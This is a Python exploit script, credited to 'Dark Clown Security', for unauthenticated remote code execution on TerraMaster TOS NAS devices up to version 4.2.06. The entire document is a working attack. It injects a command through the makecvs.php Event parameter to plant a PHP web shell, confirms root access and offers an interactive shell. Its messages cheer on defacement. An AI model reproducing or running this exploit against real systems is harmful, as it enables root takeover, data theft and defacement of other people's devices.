## Thanks To Dark Clown Security

#!/usr/bin/env python3
import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser(description="TerraMaster TOS <= 4.2.06 Unauth RCE || Dark Clown Security")
parser.add_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: http://192.168.1.111:8081/")
args = parser.parse_args()

url = args.url
headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
epoch_time = int(time.time())
shell_filename = "debug"+str(epoch_time)+".php"

def check_endpoint(url, headers):
	response = requests.get(url+'/version', headers=headers, verify=False)
	if response.status_code == 200:
		print("""
     ______
    /    Y \   \x1b[6;30;42m~ Remote Code Execution Unauthenticated ~\x1b[0m
   /        \  
   \ ()  () /  
    \  /\  /   
8====| '' |====>
      VVVV
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
|\x1b[6;30;94m Remote Code Execution TerraMaster TOS \x1b[0m
|\x1b[6;30;91m Youtube :  Dark Clown Security \x1b[0m
|\x1b[6;30;94m My Team :  Dark Clown Security \x1b[0m
|\x1b[6;30;42m Github : BELOM DI RILISH :D \x1b[0m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
			""")
		print("[+] Cek Versi CMS TerraMaster TOS =>  ", "\x1b[6;30;42m", str(response.content), "\x1b[0m")
	else:
		print("\n\x1b[6;30;91m[-] Respon Web Status : \x1b[0m", response.status_code)
		sys.exit()
		
def upload_shell(url, headers, shell_filename):
	payload = "http|echo \"<?php echo(passthru(\\$_GET['cmd']));?>\" >> /usr/www/"+shell_filename+" && chmod +x /usr/www/"+shell_filename+"||"
	payload = urllib.parse.quote(payload, safe='')
	print("\x1b[6;30;42m[/]\x1b[0m \x1b[1;32;40mSedang Tanem Bibit Di Server...\x1b[0m")
	response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False)
	time.sleep(1)
	response = requests.get(url+'/'+shell_filename+'?cmd=id', headers=headers, verify=False)
	if ('uid=0(root) gid=0(root)' in str(response.content, 'utf-8')):
		print("\x1b[6;30;42m[+]\x1b[0m \x1b[6;30;94mBibit Berhasil Di Upload :D Happy Deface Sobat Dark Clown Security\x1b[0m")
	else:
		print("\n\x1b[6;30;42m[-]\x1b[0m Tanem Bibit tidak berhasil, berdoa terlebih dahulu: ", response.content)
		sys.exit()

def interactive_shell(url, headers, shell_filename, cmd):
	response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False)
	print(str(response.text)+"\n")


def delete_shell(url, headers, shell_filename):
	delcmd = "rm /usr/www/"+shell_filename
	response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False)
	print("\n\x1b[6;30;42m[+]\x1b[0m Bibit Di Hapus")

check_endpoint(url, headers)
upload_shell(url, headers, shell_filename)
try:
	while True:
		cmd = input("\x1b\033[31;1mshell@darkclownsecurity.id # \x1b[0m")
		interactive_shell(url, headers, shell_filename, cmd)
except:
	delete_shell(url, headers, shell_filename)
